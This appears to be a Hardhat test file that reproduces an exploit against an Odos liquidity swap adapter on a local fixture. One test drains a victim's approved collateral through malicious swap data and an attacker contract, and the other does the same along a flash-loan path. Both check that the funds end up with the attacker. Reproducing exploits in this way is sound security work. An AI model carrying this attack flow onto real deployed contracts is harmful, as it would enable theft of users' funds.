import { expect } from "chai";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { ethers } from "hardhat";
import {
  BURST_ONE,
  BURST_TWO,
  COLLATERAL_DECIMALS,
  COLLATERAL_TO_SWAP,
  DUSD_RECYCLER_PULL_ONE,
  DUSD_RECYCLER_PULL_TWO,
  DUSD_RECYCLER_RETURN,
  EXTRA_COLLATERAL,
  deployOdosV1ExploitFixture,
  createMaliciousSwapData
} from "./fixtures/setup";

const COLLATERAL_DUST = 1n;

describe("OdosLiquiditySwapAdapter exploit reproduction", function () {
  it("drains victim collateral without flash loan guidance", async function () {
    const fixture = await loadFixture(deployOdosV1ExploitFixture);
    const {
      victim,
      attacker,
      attackerBeneficiary,
      pool,
      router,
      attackExecutor,
      adapter,
      wstkscUsd,
      dusd,
      aWstkscUsd
    } = fixture;

    console.log("wst", await wstkscUsd.getAddress(), "dusd", await dusd.getAddress());
    const reserveConfig = await pool.getReserveConfig(await wstkscUsd.getAddress());
    console.log("withdrawHook", reserveConfig.withdrawHook);

    const swapData = createMaliciousSwapData(router);

    const permitInput = {
      aToken: await aWstkscUsd.getAddress(),
      value: 0n,
      deadline: 0n,
      v: 0,
      r: ethers.ZeroHash,
      s: ethers.ZeroHash
    };

    await aWstkscUsd.connect(victim).approve(await adapter.getAddress(), COLLATERAL_TO_SWAP);

    const liquiditySwapParams = {
      collateralAsset: await wstkscUsd.getAddress(),
      collateralAmountToSwap: COLLATERAL_TO_SWAP,
      newCollateralAsset: await dusd.getAddress(),
      newCollateralAmount: 1n,
      user: victim.address,
      withFlashLoan: false,
      swapData
    };

    const victimBalanceBefore = await aWstkscUsd.balanceOf(victim.address);
    const attackerBalanceBefore = await wstkscUsd.balanceOf(attackerBeneficiary.address);

    await attackExecutor
      .connect(attacker)
      .executeAttack(liquiditySwapParams, permitInput);

    const victimBalanceAfter = await aWstkscUsd.balanceOf(victim.address);
    const attackerBalanceAfter = await wstkscUsd.balanceOf(attackerBeneficiary.address);

    expect(victimBalanceAfter).to.equal(victimBalanceBefore - COLLATERAL_TO_SWAP);
    expect(attackerBalanceAfter).to.equal(attackerBalanceBefore + COLLATERAL_TO_SWAP);

    const poolReserveData = await pool.getReserveData(await wstkscUsd.getAddress());
    expect(poolReserveData.aTokenAddress).to.equal(await aWstkscUsd.getAddress());
  });

  it("mirrors Sonic flash-loan exploit path and records flash-mint stages", async function () {
    const fixture = await loadFixture(deployOdosV1ExploitFixture);
    const {
      deployer,
      victim,
      attacker,
      attackerBeneficiary,
      reserveManager,
      pool,
      router,
      attackExecutor,
      adapter,
      wstkscUsd,
      dusd,
      aWstkscUsd,
      recyclerHelper
    } = fixture;

    await pool.connect(deployer).configureReserve(
      await wstkscUsd.getAddress(),
      reserveManager.address,
      await attackExecutor.getAddress(),
      0,
      EXTRA_COLLATERAL
    );

    const swapData = createMaliciousSwapData(router);

    const permitInput = {
      aToken: await aWstkscUsd.getAddress(),
      value: 0n,
      deadline: 0n,
      v: 0,
      r: ethers.ZeroHash,
      s: ethers.ZeroHash
    };

    await aWstkscUsd.connect(victim).approve(await adapter.getAddress(), COLLATERAL_TO_SWAP);

    const liquiditySwapParams = {
      collateralAsset: await wstkscUsd.getAddress(),
      collateralAmountToSwap: COLLATERAL_TO_SWAP,
      newCollateralAsset: await dusd.getAddress(),
      newCollateralAmount: 1n,
      user: victim.address,
      withFlashLoan: true,
      swapData
    };

    const victimBalanceBefore = await aWstkscUsd.balanceOf(victim.address);
    const attackerBalanceBefore = await wstkscUsd.balanceOf(attackerBeneficiary.address);
    const recyclerBefore = await dusd.balanceOf(await recyclerHelper.getAddress());

    await expect(
      attackExecutor
        .connect(attacker)
        .executeAttack(liquiditySwapParams, permitInput)
    ).to.emit(pool, "FlashLoanExecuted");

    const victimBalanceAfter = await aWstkscUsd.balanceOf(victim.address);
    const attackerBalanceAfter = await wstkscUsd.balanceOf(attackerBeneficiary.address);
    const recyclerAfter = await dusd.balanceOf(await recyclerHelper.getAddress());

    expect(victimBalanceAfter).to.equal(victimBalanceBefore - COLLATERAL_TO_SWAP);
    expect(attackerBalanceAfter).to.equal(attackerBalanceBefore + BURST_ONE + BURST_TWO);
    expect(recyclerAfter).to.equal(recyclerBefore + DUSD_RECYCLER_RETURN - DUSD_RECYCLER_PULL_ONE - DUSD_RECYCLER_PULL_TWO);

    expect(await wstkscUsd.balanceOf(await attackExecutor.getAddress())).to.equal(0n);

    const dusdBalance = await dusd.balanceOf(await attackExecutor.getAddress());
    expect(dusdBalance).to.equal(0n);
  });
});
